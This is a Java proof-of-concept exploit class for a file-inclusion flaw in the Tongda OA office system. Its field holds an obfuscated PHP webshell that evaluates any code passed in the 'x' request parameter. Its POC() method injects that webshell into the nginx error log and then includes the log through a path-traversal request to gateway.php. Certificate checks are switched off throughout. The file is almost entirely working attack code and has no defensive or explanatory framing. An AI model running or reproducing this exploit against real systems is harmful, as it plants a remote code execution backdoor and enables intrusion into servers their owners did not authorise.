package poc;

import com.github.kevinsawicki.http.HttpRequest;
import org.jsoup.Jsoup;

import java.util.Random;

public class TongdaOA_IspiritFileInclude {
    private String url;//通达OA url地址
    private String path;//通达OA path目录地址
    private String cookie;//cookie
    private String webroot;//网站根目录
    private String fileName;//上传文件名
    private String payload="<?php class G6uUX6lU { public function __construct($H0Lp0){ @eval(\"/*Zq2m6k6oUg*/\".$H0Lp0.\"/*Zq2m6k6oUg*/\"); }}new G6uUX6lU($_REQUEST['x']);?>";//webshell内容

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getCookie() {
        return cookie;
    }

    public void setCookie(String cookie) {
        this.cookie = cookie;
    }

    public String getWebroot() {
        return webroot;
    }

    public void setWebroot(String webroot) {
        this.webroot = webroot;
    }

    public String getFileName() {
        return fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public String getPayload() {
        return payload;
    }

    public void setPayload(String payload) {
        this.payload = payload;
    }

    public boolean POC() {
        //向日志文件中写入webshell
        path = "/"+payload;
        HttpRequest request = HttpRequest.get(url + path)
                .trustAllCerts()
                .trustAllHosts();
        request.body();

        path = "/ispirit/interface/gateway.php?json={\"url\":\"/general/../../nginx/logs/oa.error.log\"}";
        HttpRequest fileIncludeRequest=HttpRequest.get(url+path)
                .trustAllCerts()
                .trustAllHosts();
        return fileIncludeRequest.code() == 500;
    }
}


